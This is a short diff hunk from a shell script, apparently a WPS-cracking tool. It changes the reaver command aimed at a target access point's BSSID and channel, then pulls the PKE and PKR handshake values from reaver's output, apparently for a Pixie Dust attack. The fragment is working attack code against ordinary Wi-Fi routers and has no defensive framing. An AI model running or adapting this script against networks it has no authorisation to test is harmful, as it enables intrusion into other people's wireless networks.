@@ -34,7 +34,7 @@ exit
 }
 arguments() {
 						   echo "" > empty.txt
-                           reaver -i $mon -b $BSSID -c $CHANNEL -vv -s empty.txt > Reaver.txt &
+                           reaver -i $mon -b $BSSID -c $CHANNEL -vv -n -L -s empty.txt > Reaver.txt &
 						   ReaverID=$!
    						   e=`cat Reaver.txt | grep PKE: | cut -d' ' -f3 | sed -n 1p`
                            r=`cat Reaver.txt | grep PKR: | cut -d' ' -f3 | sed -n 1p`
